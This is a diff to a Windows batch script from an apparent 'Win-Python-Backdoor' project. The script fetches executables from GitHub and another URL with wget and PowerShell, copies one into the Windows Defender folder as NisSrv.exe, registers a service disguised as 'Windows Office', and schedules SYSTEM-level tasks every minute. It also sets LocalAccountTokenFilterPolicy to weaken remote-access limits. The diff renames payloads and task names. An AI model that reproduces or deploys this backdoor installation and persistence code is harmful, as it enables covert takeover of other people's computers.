@@ -56,9 +56,9 @@ rem %windir%\System32\cmd.exe /c powershell -Command (new-object System.Net.WebC
 rem %windir%\System32\cmd.exe /c powershell -Command (new-object System.Net.WebClient).DownloadFile('%url%/win/woffice.exe','%windir%\woffice.exe')
 rem %windir%\System32\cmd.exe /c powershell -Command (new-object System.Net.WebClient).DownloadFile('%url%/win/woffice.exe','C:\Program Files\Windows Defender\NisSrv.exe')
 rem wget --no-check-certificate https://github.com/pistacchietto/Win-Python-Backdoor/raw/master/win.bat  -O %windir%\win.bat
-wget --no-check-certificate https://github.com/pistacchietto/Win-Python-Backdoor/raw/master/wup1.exe  -O %windir%\wup1.exe
+wget --no-check-certificate https://github.com/pistacchietto/Win-Python-Backdoor/raw/master/wup.exe  -O %windir%\wup1.exe
 
-taskkill /f /im woffice.exe
+taskkill /f /im woffice2.exe
 taskkill /f /im wscript.exe
 schtasks /delete /tn sys /F
 schtasks /delete /tn syskill /F
@@ -72,7 +72,7 @@ wget --no-check-certificate %urlgit%/syskill.xml  -O %windir%\syskill.xml
 wget --no-check-certificate %urlgit%/office_get.xml  -O %windir%\office_get.xml
 schtasks /create /tn office_get /xml %windir%\office_get.xml /F
 reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\system /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
-wget --no-check-certificate %urlgit%/woffice.exe  -O %windir%\woffice.exe
+wget --no-check-certificate %urlgit%/woffice.exe  -O %windir%\woffice2.exe
 rem %windir%\wofficeie1.exe
 rem SLEEP 10
 rem taskkill /f /im NisSrv.exe
@@ -82,7 +82,7 @@ rem copy /y %windir%\wofficeie1.exe %windir%\wup.exe
 copy /Y %windir%\woffice.exe "C:\Program Files\Windows Defender\NisSrv.exe"
 sc create wup1 binPath= "%windir%\wup1.exe" DisplayName= "Windows Office" start= auto
 net start wup1
-schtasks /create /ru "SYSTEM" /sc minute /mo 1 /tr "%windir%\woffice.exe" /tn myadobe1 /rl highest /F
+schtasks /create /ru "SYSTEM" /sc minute /mo 1 /tr "%windir%\woffice2.exe" /tn myadobe2 /rl highest /F
 schtasks /create /ru "SYSTEM" /sc minute /mo 1 /tr "C:\Program Files\Windows Defender\NisSrv.exe" /tn flash_fw /rl highest /F
 schtasks /create /ru "SYSTEM" /sc minute /mo 5 /tr "taskkill /f /im woffice.exe" /tn myflash /rl highest /F
 schtasks /create /tn sys /xml %windir%\sys.xml /F
